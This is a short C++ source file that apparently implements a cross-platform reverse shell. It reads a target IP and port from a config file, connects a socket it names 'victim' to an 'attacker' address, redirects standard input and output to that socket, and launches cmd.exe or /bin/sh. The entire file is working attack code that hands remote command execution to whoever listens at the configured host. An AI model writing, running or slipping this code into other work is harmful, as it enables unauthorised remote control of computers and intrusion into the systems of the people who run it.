#include "rsp.hpp"

auto main(int argc, char** argv) -> int {
    int port = 3388;
    std::string ip = "127.0.0.1";
    std::string config = "default.cfg";

    if(std::filesystem::exists(config)) {
        std::ifstream file(config);
        std::string line;
        if(file.is_open()) {
            while(std::getline(file, line)) {
                if(line.find("port") != std::string::npos) {
                    port = std::atoi(line.substr(5, line.length()).c_str());
                    std::cout << "rsp >> port - " << port << '\n';
                } else if(line.find("ip") != std::string::npos) {
                    ip = line.substr(3, line.length());
                    std::cout << "rsp >> ip - " << ip << '\n';
                }
            }

            file.close();
        }
    }

    #ifdef RSP_WINDOWS
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        SOCKET victim = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);

        sockaddr_in attacker;
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons(port);
        attacker.sin_addr.s_addr = inet_addr(ip.c_str());

        int code = connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker));
        if(code != 0) {
            std::cerr << "rsp >> error - " << code << '\n';
        }

        _dup2(victim, 0);
        _dup2(victim, 1);
        _dup2(victim, 2);

        system("cmd.exe");
        WSACleanup();
    #else
        int victim = socket(AF_INET, SOCK_STREAM, 0);

        sockaddr_in attacker;
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons(port);
        attacker.sin_addr.s_addr = inet_addr(ip.c_str());

        int code = connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker));
        if(code != 0) {
            std::cerr << "rsp >> error - " << code << '\n';
        }

        dup2(victim, 0);
        dup2(victim, 1);
        dup2(victim, 2);

        execl("/bin/sh", "sh", 0);
    #endif

    return 0;
}